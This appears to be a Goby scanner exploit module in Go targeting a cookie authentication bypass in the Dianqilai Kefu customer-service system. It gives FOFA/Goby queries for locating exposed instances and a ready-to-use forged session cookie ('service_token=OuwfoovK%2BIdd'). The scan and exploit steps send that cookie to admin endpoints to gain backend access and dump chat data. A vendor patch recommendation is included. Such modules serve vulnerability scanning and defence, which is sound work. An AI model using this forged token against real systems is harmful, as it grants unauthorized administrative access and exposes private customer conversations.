package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
)

func init() {
	expJson := `{
    "Name": "Dianqilai Kefu system Cookie authentication bypass vulnerability",
    "Description": "<p>Dianqilai Kefu system deployed with privatized source code, which supports access to small programs, official accounts, websites, and APPs.</p><p>The Dianqilai Kefu system can forge the system session based on the service_id due to the hard-coded session encrypted KEY, so that the background permission can be directly obtained by bypassing the permission verification.</p>",
    "Product": "Dianqilai-Kefu",
    "Homepage": "https://www.zjhejiang.com/",
    "DisclosureDate": "2022-11-11",
    "Author": "sharecast",
    "FofaQuery": "body=\"/platform/passport/resetpassword.html\" || body=\"/dianqilai.ico\" || (body=\"layui-form-item\" && body=\"/admin/login/check.html\")",
    "GobyQuery": "body=\"/platform/passport/resetpassword.html\" || body=\"/dianqilai.ico\" || (body=\"layui-form-item\" && body=\"/admin/login/check.html\")",
    "Level": "3",
    "Impact": "<p>Attackers can control the entire system through permission bypass vulnerabilities, and ultimately lead to an extremely insecure state of the system.</p>",
    "Recommendation": "<p>At present, the manufacturer has released a patch, please update it in time:</p><p><a href=\"https://www.zjhejiang.com/site/app-detail?id=44\">https://www.zjhejiang.com/site/app-detail?id=44</a></p><p><a href=\"https://www.opencartextensions.in/opencart-multi-vendor-multi-seller-marketplace\"></a></p>",
    "References": [
        "https://mp.weixin.qq.com/s/-LnDOjoqYMjtjoVV9l-EuA"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/admin/custom/index.html",
                "follow_redirect": false,
                "header": {
                    "Cookie": "service_token=OuwfoovK%2BIdd",
                    "X-Requested-With": "XMLHttpRequest"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "data.message.groupid",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "business_id",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/admin/set/getchats",
                "follow_redirect": false,
                "header": {
                    "Cookie": "service_token=OuwfoovK%2BIdd",
                    "X-Requested-With": "XMLHttpRequest"
                },
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": [
                "output|lastbody|text|{{{fixedhostinfo}}}/admin/custom/index.html,  Cookie: service_token=OuwfoovK%2BIdd"
            ]
        }
    ],
    "Tags": [
        "Permission Bypass"
    ],
    "VulType": [
        "Permission Bypass"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "点企来客服系统 Cookie 认证绕过漏洞",
            "Product": "点企来客服系统",
            "Description": "<p>点企来是私有化源码部署的客服系统，支持接入到小程序、公众号、网站、APP。</p><p>点企来客服系统由于硬编码session加密的KEY导致系统session可以根据service_id进行伪造，从而导致可以绕过权限校验直接获取后台权限。</p>",
            "Recommendation": "<p>目前厂商已经发布补丁，请及时进行更新：</p><p><a href=\"https://www.zjhejiang.com/site/app-detail?id=44\">https://www.zjhejiang.com/site/app-detail?id=44</a><br></p>",
            "Impact": "<p>攻击者可通过权限绕过漏洞控制整个系统，最终导致系统处于极度不安全状态。<br></p>",
            "VulType": [
                "权限绕过"
            ],
            "Tags": [
                "权限绕过"
            ]
        },
        "EN": {
            "Name": "Dianqilai Kefu system Cookie authentication bypass vulnerability",
            "Product": "Dianqilai-Kefu",
            "Description": "<p>Dianqilai Kefu system deployed with privatized source code, which supports access to small programs, official accounts, websites, and APPs.</p><p>The Dianqilai Kefu system can forge the system session based on the service_id due to the hard-coded session encrypted KEY, so that the background permission can be directly obtained by bypassing the permission verification.</p>",
            "Recommendation": "<p>At present, the manufacturer has released a patch, please update it in time:</p><p><a href=\"https://www.zjhejiang.com/site/app-detail?id=44\">https://www.zjhejiang.com/site/app-detail?id=44</a><br></p><p><a href=\"https://www.opencartextensions.in/opencart-multi-vendor-multi-seller-marketplace\"></a></p>",
            "Impact": "<p>Attackers can control the entire system through permission bypass vulnerabilities, and ultimately lead to an extremely insecure state of the system.<br></p>",
            "VulType": [
                "Permission Bypass"
            ],
            "Tags": [
                "Permission Bypass"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10755"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		nil,
		nil,
	))
}